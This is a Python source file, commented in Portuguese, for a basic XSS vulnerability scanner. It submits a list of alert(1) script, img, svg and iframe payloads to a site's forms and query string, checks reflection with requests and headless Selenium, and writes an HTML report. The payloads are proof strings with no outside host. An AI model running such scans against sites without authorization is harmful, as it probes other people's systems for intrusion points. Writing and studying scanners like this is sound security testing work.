import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import time
import os
import re
from termcolor import colored  # Para destacar as vulnerabilidades com cores
import logging


# Inicializando logging
logging.basicConfig(filename="sentinela_primeiro.log", level=logging.INFO)

# Payloads comuns para XSS
XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"<script>alert(1)</script>',
    "'<script>alert(1)</script>",
    '<IMG SRC=javascript:alert(1)>',
    '<BODY ONLOAD=alert(1)>',
    '<svg/onload=alert(1)>',
    '<iframe src="javascript:alert(1)">'
]

def normalize_url(url):
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    return url

def get_all_forms(url):
    try:
        soup = BeautifulSoup(requests.get(url, timeout=10).content, "html.parser")
        return soup.find_all("form")
    except Exception as e:
        logging.error(f"Erro ao buscar formulários: {e}")
        return []

def get_form_details(form):
    details = {}
    try:
        action = form.attrs.get("action", "").strip()
        method = form.attrs.get("method", "get").lower()
        inputs = []
        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            inputs.append({"type": input_type, "name": input_name})
        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
    except Exception as e:
        logging.error(f"Erro ao extrair detalhes do formulário: {e}")
    return details

def submit_form(form_details, url, payload):
    target_url = urljoin(url, form_details["action"])
    data = {}
    for input_tag in form_details["inputs"]:
        if input_tag["type"] == "text" or input_tag["type"] == "search":
            data[input_tag["name"]] = payload
        elif input_tag["name"] is not None:
            data[input_tag["name"]] = "test"
    try:
        if form_details["method"] == "post":
            return requests.post(target_url, data=data, timeout=10)
        else:
            return requests.get(target_url, params=data, timeout=10)
    except Exception as e:
        logging.error(f"Erro ao enviar formulário: {e}")
        return None

def detect_dom_xss_with_selenium(url, payload):
    try:
        chrome_options = Options()
        chrome_options.add_argument("--headless")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--no-sandbox")
        driver = webdriver.Chrome(options=chrome_options)
        full_url = url + f"?xss={payload}"
        driver.get(full_url)
        time.sleep(2)
        if payload in driver.page_source:
            driver.quit()
            return True
        driver.quit()
    except Exception as e:
        logging.error(f"Erro no Selenium: {e}")
    return False

def classify_severity(payload):
    if 'svg' in payload or 'iframe' in payload:
        return 'ALTA'
    elif '<script>' in payload:
        return 'MÉDIA'
    else:
        return 'BAIXA'

def highlight_severity(gravidade):
    if gravidade == 'ALTA':
        return colored(gravidade, 'red', attrs=['bold'])
    elif gravidade == 'MÉDIA':
        return colored(gravidade, 'yellow', attrs=['bold'])
    else:
        return colored(gravidade, 'green')

def generate_xss_report(results, domain):
    os.makedirs("relatorios", exist_ok=True)
    report_path = f"relatorios/xss_{domain.replace('.', '_')}.html"
    with open(report_path, "w") as f:
        f.write(f"<h1>Relatório de Vulnerabilidades XSS - {domain}</h1>\n")
        f.write("<hr>\n")
        for result in results:
            f.write(f"<p><strong>URL:</strong> {result['url']}<br>\n")
            f.write(f"<strong>Payload:</strong> {result['payload']}<br>\n")
            f.write(f"<strong>Gravidade:</strong> {highlight_severity(result['gravidade'])}<br>\n")
            f.write("</p><hr>\n")
    print(f"[+] Relatório salvo em {report_path}")
    logging.info(f"Relatório salvo em {report_path}")


def run_xss(domain):
    print(f"Scanning {domain} for XSS vulnerabilities...")
    url = normalize_url(domain)
    forms = get_all_forms(url)
    found = []

    for form in forms:
        details = get_form_details(form)
        for payload in XSS_PAYLOADS:
            response = submit_form(details, url, payload)
            if response and payload in response.text:
                gravidade = classify_severity(payload)
                found.append({"url": url, "payload": payload, "gravidade": gravidade})

    for payload in XSS_PAYLOADS:
        if detect_dom_xss_with_selenium(url, payload):
            gravidade = classify_severity(payload)
            found.append({"url": url, "payload": payload, "gravidade": gravidade})

    if found:
        print(f"[+] {len(found)} XSS vulnerabilities detected!")
        for f in found:
            print(f" - {highlight_severity(f['gravidade'])} {f['url']} [Payload: {f['payload']}]")

    else:
        print("No XSS vulnerabilities detected.")
        logging.info(f"No XSS vulnerabilities detected for {domain}")
